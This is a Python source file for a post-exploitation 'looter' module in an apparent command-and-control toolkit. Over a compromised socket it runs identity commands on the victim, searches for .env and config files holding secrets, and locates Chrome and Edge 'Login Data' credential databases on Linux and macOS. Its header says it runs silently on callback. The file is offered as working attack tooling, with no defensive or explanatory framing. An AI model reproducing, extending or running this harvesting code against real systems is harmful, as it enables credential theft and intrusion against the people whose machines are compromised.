# --- Module Context: LOOTER (Post-Exploitation) ---
# Purpose: Automated data harvesting from established C2 connections.
# Rules:
#   - Executes silently upon initial 'Ghost' callback.
#   - Targets high-value artifacts: .env files, browser databases, and SSH keys.
# --------------------------------------------------

import time
import os


def auto_recon(sock):
    """Gathers critical system and identity info instantly."""
    try:
        # 1. Identity Harvesting
        sock.send(b"whoami && hostname && id\n")
        time.sleep(0.5)
        raw_info = sock.recv(2048).decode().strip().split('\n')

        # 2. High-Value File Search (Searching for secrets)
        # Looks for .env, .git/config, and AWS credentials
        sock.send(
            b"find . -maxdepth 3 -name '.env' -o -name 'config.json' 2>/dev/null\n")
        time.sleep(0.5)
        secret_files = sock.recv(2048).decode().strip().replace('\n', ', ')

        intel = {
            'user': raw_info[0] if len(raw_info) > 0 else "unknown",
            'host': raw_info[1] if len(raw_info) > 1 else "unknown",
            'secrets': secret_files if secret_files else "None Found"
        }
        return intel
    except:
        return {'user': 'error', 'host': 'error', 'secrets': 'N/A'}


def harvest_credentials(sock):
    """Targets browser credential databases for exfiltration."""
    # Professional C2s target the Chrome/Edge 'Login Data' SQLite DB
    commands = [
        "ls ~/.config/google-chrome/Default/Login\\ Data 2>/dev/null",  # Linux
        "ls ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data 2>/dev/null"  # macOS
    ]
    for cmd in commands:
        sock.send(f"{cmd}\n".encode())
        path = sock.recv(1024).decode().strip()
        if path:
            return f"Found Chrome DB: {path}"
    return "No Browser DB Found"
